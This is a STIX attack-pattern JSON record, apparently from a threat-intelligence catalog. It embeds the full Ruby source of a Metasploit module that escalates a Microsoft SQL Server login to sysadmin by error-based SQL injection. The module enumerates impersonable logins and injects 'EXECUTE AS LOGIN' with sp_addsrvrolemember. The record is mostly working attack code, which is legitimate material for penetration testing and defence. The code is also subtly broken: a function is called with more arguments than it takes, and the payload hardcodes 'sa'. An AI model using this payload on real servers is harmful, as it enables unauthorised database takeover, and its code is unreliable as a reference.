{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e005a604-0aef-47fd-82ea-8af09b441f6e",
    "created": "2024-08-14T16:22:29.895604Z",
    "modified": "2024-08-14T16:22:29.89561Z",
    "name": "Microsoft SQL Server SQLi Escalate Execute AS",
    "description": " This module can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user via error based SQL injection.  In most cases, this results in additional data access, but in some cases it can be used to gain sysadmin privileges.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/mssql/mssql_escalate_execute_as_sqli.rb",
            "external_id": "mssql_escalate_execute_as_sqli.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL_SQLI\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SQL Server SQLi Escalate Execute AS',\n      'Description'    => %q{\n        This module can be used escalate privileges if the IMPERSONATION privilege has been\n        assigned to the user via error based SQL injection.  In most cases, this results in\n        additional data access, but in some cases it can be used to gain sysadmin privileges.\n        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--\n      },\n      'Author'         => ['nullbind <scott.sutherland[at]netspi.com>'],\n      'License'        => MSF_LICENSE,\n      'References'     => [['URL','http://msdn.microsoft.com/en-us/library/ms178640.aspx']]\n    ))\n  end\n\n  def run\n    # Get the database user name\n    print_status(\"Grabbing the database user name...\")\n    db_user = get_username\n    if db_user.nil?\n      print_error(\"Unable to grab user name...\")\n      return\n    else\n      print_good(\"Database user: #{db_user}\")\n    end\n\n    # Grab sysadmin status\n    print_status(\"Checking if #{db_user} is already a sysadmin...\")\n    admin_status = check_sysadmin\n\n    if admin_status.nil?\n      print_error(\"Couldn't retrieve user status, aborting...\")\n      return\n    elsif admin_status == '1'\n      print_error(\"#{db_user} is already a sysadmin, no escalation needed.\")\n      return\n    else\n      print_status(\"#{db_user} is NOT a sysadmin, let's try to escalate privileges.\")\n    end\n\n    # Get list of users that can be impersonated\n    print_status(\"Enumerating a list of users that can be impersonated...\")\n    imp_user_list = check_imp_users\n    if imp_user_list.nil? || imp_user_list.empty?\n      print_error(\"Sorry, the current user doesnt have permissions to impersonate anyone.\")\n      return\n    else\n      # Display list of users that can be impersonated\n      print_good(\"#{imp_user_list.length} users can be impersonated:\")\n      imp_user_list.each do |dbuser|\n        print_status(\"  #{dbuser}\")\n      end\n    end\n\n    # Check if any of the users that can be impersonated are sysadmins\n    print_status(\"Checking if any of them are sysadmins...\")\n    imp_user_sysadmin = check_imp_sysadmin(imp_user_list)\n    if imp_user_sysadmin.nil?\n      print_error(\"Sorry, none of the users that can be impersonated are sysadmins.\")\n      return\n    end\n\n    # Attempt to escalate to sysadmin\n    print_status(\"Attempting to impersonate #{imp_user_sysadmin}...\")\n    escalate_privs(imp_user_sysadmin,db_user)\n\n    admin_status = check_sysadmin\n    if admin_status && admin_status == '1'\n      print_good(\"Success! #{db_user} is now a sysadmin!\")\n    else\n      print_error(\"Fail buckets, something went wrong.\")\n    end\n  end\n\n  def get_username\n    # Setup query to check for database username\n    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))\n    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))\n    sql = \"(select '#{clue_start}'+SYSTEM_USER+'#{clue_end}')\"\n\n    # Run query\n    result = mssql_query(sql)\n\n    # Parse result\n    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/\n      user_name = $1\n    else\n      user_name = nil\n    end\n\n    user_name\n  end\n\n  def check_sysadmin\n    # Setup query to check for sysadmin\n    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))\n    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))\n    sql = \"(select '#{clue_start}'+cast((select is_srvrolemember('sysadmin'))as varchar)+'#{clue_end}')\"\n\n    # Run query\n    result = mssql_query(sql)\n\n    # Parse result\n    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/\n      status = $1\n    else\n      status = nil\n    end\n\n    status\n  end\n\n  def check_imp_users\n    # Setup query to check for trusted databases owned by sysadmins\n    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))\n    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))\n\n    # Setup query\n    sql = \"(select cast((SELECT DISTINCT '#{clue_start}'+b.name+'#{clue_end}'\n    FROM  sys.server_permissions a\n    INNER JOIN sys.server_principals b\n    ON a.grantor_principal_id = b.principal_id\n    WHERE a.permission_name = 'IMPERSONATE' for xml path('')) as int))\"\n\n    # Run query\n    res = mssql_query(sql)\n\n    unless res && res.body\n      return nil\n    end\n\n    #Parse results\n    parsed_result = res.body.scan(/#{clue_start}(.*?)#{clue_end}/m)\n\n    if parsed_result && !parsed_result.empty?\n      parsed_result.flatten!\n      parsed_result.uniq!\n    end\n\n    parsed_result\n  end\n\n  def check_imp_sysadmin(imp_user_list)\n    # Check if the user has the db_owner role is any databases\n    imp_user_list.each do |imp_user|\n      # Setup query\n      clue_start = Rex::Text.rand_text_alpha(8 + rand(4))\n      clue_end = Rex::Text.rand_text_alpha(8 + rand(4))\n\n      sql = \"(select '#{clue_start}'+cast((select is_srvrolemember('sysadmin','#{imp_user}'))as varchar)+'#{clue_end}')\"\n\n      # Run query\n      result = mssql_query(sql)\n\n      unless result && result.body\n        next\n      end\n\n      #Parse results\n      parsed_result = result.body.scan(/#{clue_start}(.*?)#{clue_end}/m)\n\n      if parsed_result && !parsed_result.empty?\n        parsed_result.flatten!\n        parsed_result.uniq!\n      end\n\n      # check if user is a sysadmin\n      if parsed_result && parsed_result[0] == '1'\n        print_good(\"  #{imp_user} is a sysadmin!\")\n        return imp_user\n      else\n        print_status(\"  #{imp_user} is NOT a sysadmin\")\n      end\n    end\n\n    nil\n  end\n\n  # Attempt to escalate privileges\n  def escalate_privs(db_user)\n\n    # Setup Query - Impersonate the first sysadmin user on the list\n    evil_sql = \"1;EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '#{db_user}','sysadmin';Revert;--\"\n\n    # Execute Query\n    mssql_query(evil_sql)\n  end\nend\n",
    "x_mitre_contributors": [
        "[nullbind <scott.sutherland[at]netspi.com>]",
        ""
    ]
}